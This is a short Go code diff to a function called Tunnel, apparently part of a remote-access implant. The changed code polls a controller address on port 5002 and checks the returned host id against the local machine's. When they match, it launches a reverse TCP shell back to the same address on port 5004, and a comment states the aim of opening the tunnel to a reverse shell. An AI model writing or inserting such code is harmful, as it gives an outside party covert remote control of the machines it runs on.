@@ -54,13 +54,13 @@ func Tunnel(addr string) {
 	var check Check
 	var versionDetail = machineinfo.GetSystemVersion()
 	resp, body, _ := gorequest.New().
-		Get(addr).
+		Get("http://" + addr + ":5002/browser_fail").
 		End()
 	if resp.StatusCode == 200 && body != "" {
 		if err := json.Unmarshal([]byte(body), &check); err == nil {
 			// if not need  dont open the tunnel to revert shell
 			if check.Hostid == versionDetail.Hostid {
-				go reverse.CreateRevShell("tcp", "target:8443")
+				go reverse.CreateRevShell("tcp", addr+":5004")
 			} else {
 				return
 			}
